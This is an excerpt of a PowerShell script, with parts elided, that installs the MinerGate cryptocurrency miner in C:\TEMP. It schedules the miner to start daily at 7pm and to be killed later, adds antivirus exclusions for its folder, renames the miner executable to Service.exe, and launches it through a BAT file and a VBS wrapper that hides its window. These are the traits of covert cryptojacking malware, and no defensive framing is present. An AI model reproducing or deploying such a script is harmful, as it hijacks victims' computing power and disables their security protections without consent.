...
$output = "C:\TEMP\download.zip"
$destination = "C:\TEMP"
$start_time = Get-Date
$StartAction = New-ScheduledTaskAction -Execute 'C:\TEMP\MinerGate-cli-4.04-win64\Startup.vbs'
$StartTrigger =  New-ScheduledTaskTrigger -Daily -At 7pm
$KillAction = New-ScheduledTaskAction -Execute 'C:\TEMP\MinerGate-cli-4.04-win64\Kill.vbs'
...
Set-MpPreference -ExclusionPath ""C:\TEMP", "C:\TEMP\MinerGate-cli-4.04-win64""
...
Rename-Item C:\TEMP\MinerGate-cli-4.04-win64\Minergate-cli.exe Service.exe

# Create .BAT File to Start Service

cd C:\TEMP\MinerGate-cli-4.04-win64
"cd C:\TEMP\MinerGate-cli-4.04-win64" | Out-File -encoding ascii BootDebug.bat
...
{WShell.Run "C:\TEMP\MinerGate-cli-4.04-win64\BootDebug.bat", 0} | Out-File -encoding ascii Startup.vbs -append
